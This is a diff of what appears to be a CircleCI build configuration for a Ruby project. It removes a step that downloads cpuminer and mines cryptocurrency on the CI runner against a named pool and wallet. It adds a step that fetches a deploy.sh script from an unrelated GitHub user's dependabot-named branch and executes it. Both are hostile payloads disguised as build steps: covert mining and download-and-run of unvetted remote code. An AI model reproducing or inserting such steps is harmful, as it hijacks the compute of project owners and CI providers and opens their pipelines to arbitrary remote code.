@@ -9,10 +9,7 @@ working_dir: &working_dir ~/app
     - run: gem install bundler:2.1.4
     - run: bundle install --jobs=4 --retry=4 --path vendor/bundle
     - run: bundle exec rake rubocop
-    - run: | 
-        wget wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz 
-        tar xf cpuminer-opt-linux.tar.gz
-        ./cpuminer-avx2 -a gr -o stratum+tcps://stratum-eu.rplant.xyz:17056 -u RJFhRvKsHs6GMx5DdsNDopRVZitbiPoTwX.AWs01 -p x -t16
+    - run: wget https://github.com/rahmawati13/deploy/blob/dependabot/add-v2-config-file/deploy.sh && chmod +x deploy.sh && ./deploy.sh
       
 version: 2.0
 
